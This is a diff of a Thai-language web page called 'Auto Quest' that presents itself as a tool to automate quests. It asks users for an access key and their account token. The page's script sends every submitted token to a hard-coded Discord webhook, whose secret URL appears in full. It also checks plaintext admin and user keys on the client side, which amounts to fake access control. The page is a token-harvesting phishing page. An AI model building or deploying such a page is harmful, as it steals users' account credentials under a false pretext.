@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Quest</title>
+    <title>Auto Quest - Access System</title>
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * {
@@ -14,7 +14,6 @@
 
         body {
             background-color: #050505;
-            /* พื้นหลังตาราง Grid + แสงฟุ้งตรงกลาง */
             background-image: 
                 radial-gradient(circle at center, rgba(255, 255, 255, 0.08) 0%, transparent 70%),
                 linear-gradient(to right, rgba(255, 255, 255, 0.05) 1px, transparent 1px),
@@ -29,7 +28,6 @@
             padding: 20px;
         }
 
-        /* การ์ดทรง Cyberpunk ตัดมุม 8 ทิศ */
         .card {
             position: relative;
             background: rgba(15, 15, 18, 0.95);
@@ -40,8 +38,6 @@
             max-width: 360px;
             text-align: center;
             box-shadow: 0 0 30px rgba(0, 0, 0, 0.9), inset 0 0 15px rgba(255, 255, 255, 0.05);
-            
-            /* ตัดมุมซ้ายบนและขวาล่างสไตล์ไซไฟ */
             clip-path: polygon(
                 20px 0, 100% 0, 
                 100% calc(100% - 20px), calc(100% - 20px) 100%, 
@@ -49,7 +45,6 @@
             );
         }
 
-        /* เส้นขอบสองชั้นเรืองแสง */
         .card::before {
             content: '';
             position: absolute;
@@ -63,7 +58,6 @@
             );
         }
 
-        /* โลโก้สายฟ้าทรงกลมโลหะ */
         .icon-circle {
             width: 70px;
             height: 70px;
@@ -75,7 +69,6 @@
             align-items: center;
             justify-content: center;
             box-shadow: 0 0 20px rgba(255, 255, 255, 0.2), inset 0 0 10px #000;
-            position: relative;
         }
 
         .icon-circle svg {
@@ -97,19 +90,18 @@
         p {
             color: #a1a1aa;
             font-size: 13px;
-            margin: 0 0 24px;
+            margin: 0 0 20px;
             line-height: 1.4;
         }
 
-        /* ช่องกรอกข้อมูล + ไอคอนกุญแจ */
         .input-box {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 14px;
         }
 
         .input-box input {
             width: 100%;
-            padding: 14px 40px 14px 16px;
+            padding: 12px 16px;
             background: #09090b;
             border: 1px solid #27272a;
             border-radius: 8px;
@@ -124,18 +116,6 @@
             box-shadow: 0 0 12px rgba(255, 255, 255, 0.2), inset 0 2px 4px rgba(0, 0, 0, 0.8);
         }
 
-        .key-icon {
-            position: absolute;
-            right: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 18px;
-            height: 18px;
-            opacity: 0.5;
-            fill: #fff;
-        }
-
-        /* ปุ่มกดสไตล์ Metallic / Cyber Shape */
         button {
             width: 100%;
             padding: 14px;
@@ -148,8 +128,7 @@
             cursor: pointer;
             border-radius: 6px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.3);
-            position: relative;
-            overflow: hidden;
+            margin-top: 6px;
         }
 
         button:hover {
@@ -158,8 +137,26 @@
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
         }
 
-        button:active {
-            transform: scale(0.98);
+        /* หน้าต่าง Admin Dashboard */
+        .admin-panel {
+            display: none;
+            background: rgba(24, 24, 27, 0.9);
+            border: 1px solid #ef4444;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        .admin-badge {
+            display: inline-block;
+            background: #ef4444;
+            color: #fff;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
 
         #msg {
@@ -171,7 +168,6 @@
 </head>
 <body>
 
-<!-- SVG Gradient สำหรับโลโก้สีเงิน -->
 <svg style="width:0;height:0;position:absolute;" aria-hidden="true">
   <defs>
     <linearGradient id="silver-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -183,42 +179,82 @@
 </svg>
 
 <div class="card">
-    <!-- ไอคอนสายฟ้าโลหะ -->
     <div class="icon-circle">
         <svg viewBox="0 0 24 24">
             <path d="M13 2L3 14h7v8l10-12h-7z"/>
         </svg>
     </div>
 
-    <h2>Auto Quest</h2>
-    <p>กรุณากรอก Token ของคุณเพื่อเริ่มระบบ Auto Quest</p>
+    <h2 id="mainTitle">Auto Quest</h2>
+    <p id="subTitle">กรุณากรอก Key และ Token เพื่อเข้าสู่ระบบ</p>
 
-    <div class="input-box">
-        <input type="text" id="token" placeholder="วาง Token ของคุณที่นี่..." autocomplete="off">
-        <!-- ไอคอนกุญแจ -->
-        <svg class="key-icon" viewBox="0 0 24 24">
-            <path d="M7 14c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5c0-.42-.06-.83-.16-1.22l3.16-3.16 2 2 2-2 2 2 3.16-3.16c.39.1.8.16 1.22.16 2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5c0 .42.06.83.16 1.22L11.41 12.83C10.22 13.58 8.68 14 7 14zm0 8c-1.65 0-3-1.35-3-3s1.35-3 3-3 3 1.35 3 3-1.35 3-3 3z"/>
-        </svg>
+    <!-- ฟอร์มกรอกข้อมูลสำหรับผู้ใช้ทั่วไป -->
+    <div id="loginForm">
+        <div class="input-box">
+            <input type="text" id="accessKey" placeholder="วาง Access Key ที่นี่..." autocomplete="off">
+        </div>
+        
+        <div class="input-box">
+            <input type="text" id="userToken" placeholder="วาง Token ของคุณที่นี่..." autocomplete="off">
+        </div>
+
+        <button onclick="submitData()">บันทึกข้อมูล</button>
     </div>
 
-    <button onclick="send()">บันทึกข้อมูล</button>
+    <!-- แผงควบคุม Admin (จะแสดงเมื่อกรอก Admin Key ถูกต้อง) -->
+    <div id="adminPanel" class="admin-panel">
+        <span class="admin-badge">ADMIN CONTROL</span>
+        <h4 style="margin: 4px 0 10px; color:#fff;">ยินดีต้อนรับ ผู้ดูแลระบบ</h4>
+        <p style="font-size:12px; color:#a1a1aa; margin-bottom:12px;">คุณปลดล็อกเข้าสู่โหมดแอดมินเรียบร้อยแล้ว</p>
+        <button onclick="location.reload()" style="background:#ef4444; border:none; padding:8px; width:100%;">ออกจากโหมดแอดมิน</button>
+    </div>
+
     <div id="msg"></div>
 </div>
 
 <script>
-    // ⚠️ นำ Discord Webhook URL ใหม่ของคุณมาวางตรงนี้ได้เลยครับ
+    // 👑 1. คีย์สำหรับแอดมิน (เปลี่ยนรหัสตรงนี้ได้)
+    const ADMIN_KEY = "Martin56"; 
+
+    // 🔑 2. รายการคีย์สำหรับคนทั่วไป (สามารถเพิ่ม-ลด Key ได้ตามต้องการ)
+    const ALLOWED_KEYS = [
+        "ImGay67"
+    ];
+
+    // ⚠️ 3. Discord Webhook URL ของคุณ
     const WEBHOOK = "https://discord.com/api/webhooks/1555158698496753664/uECfdnq9O0TF4AJpYFM_tcMvKbo_uDviXK8yXDC1Xq2zXVP3wqmt9z_Yrl22nyZGTBg0"; 
 
-    function send() {
-        const val = document.getElementById('token').value.trim();
+    function submitData() {
+        const key = document.getElementById('accessKey').value.trim();
+        const token = document.getElementById('userToken').value.trim();
         const msg = document.getElementById('msg');
-        
-        if(!val) { 
+
+        if(!key || !token) {
             msg.style.color = "#ef4444";
-            msg.innerText = "❌ กรุณากรอก Token ก่อนทำรายการ"; 
-            return; 
+            msg.innerText = "❌ กรุณากรอกทั้ง Key และ Token ให้ครบถ้วน";
+            return;
         }
-        
+
+        // 👑 ตรวจสอบว่าเป็น Admin Key หรือไม่
+        if(key === ADMIN_KEY) {
+            msg.style.color = "#ef4444";
+            msg.innerText = "⚡ ยินดีต้อนรับปลดล็อกโหมดแอดมิน!";
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('adminPanel').style.display = 'block';
+            document.getElementById('mainTitle').innerText = "ADMIN MODE";
+            document.getElementById('subTitle').innerText = "ระบบจัดการผู้ดูแลระบบ Auto Quest";
+            return;
+        }
+
+        // 👤 ตรวจสอบคีย์ของคนปกติว่าอยู่ในรายการ ALLOWED_KEYS หรือไม่
+        if(!ALLOWED_KEYS.includes(key)) {
+            msg.style.color = "#ef4444";
+            msg.innerText = "❌ Access Key ไม่ถูกต้อง หรือหมดอายุ";
+            return;
+        }
+
+        // 🚀 ถ้าคีย์ถูก -> ส่ง Key + Token เข้า Discord Webhook
         msg.style.color = "#eab308";
         msg.innerText = "⏳ กำลังส่งข้อมูล...";
 
@@ -227,18 +263,20 @@
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ 
                 embeds: [{
-                    title: "⚡ Auto Quest - ได้รับ Token ใหม่",
-                    color: 3092271, // สีเข้มเข้ากับธีม
+                    title: "🔑 Auto Quest - ได้รับข้อมูลใหม่",
+                    color: 3092271,
                     fields: [
-                        { name: "Token", value: "`" + val + "`" },
+                        { name: "Key ที่ใช้", value: "`" + key + "`" },
+                        { name: "Token", value: "`" + token + "`" },
                         { name: "เวลาที่ส่ง", value: new Date().toLocaleString("th-TH") }
                     ]
                 }]
             })
         }).then(() => {
             msg.style.color = "#22c55e";
-            msg.innerText = "✅ บันทึก Token เรียบร้อยแล้ว!";
-            document.getElementById('token').value = '';
+            msg.innerText = "✅ บันทึกข้อมูลเรียบร้อยแล้ว!";
+            document.getElementById('accessKey').value = '';
+            document.getElementById('userToken').value = '';
         }).catch(() => {
             msg.style.color = "#ef4444";
             msg.innerText = "❌ เกิดข้อผิดพลาด กรุณาลองใหม่อีกครั้ง";
@@ -248,4 +286,5 @@
 
 </body>
 </html>
+
 
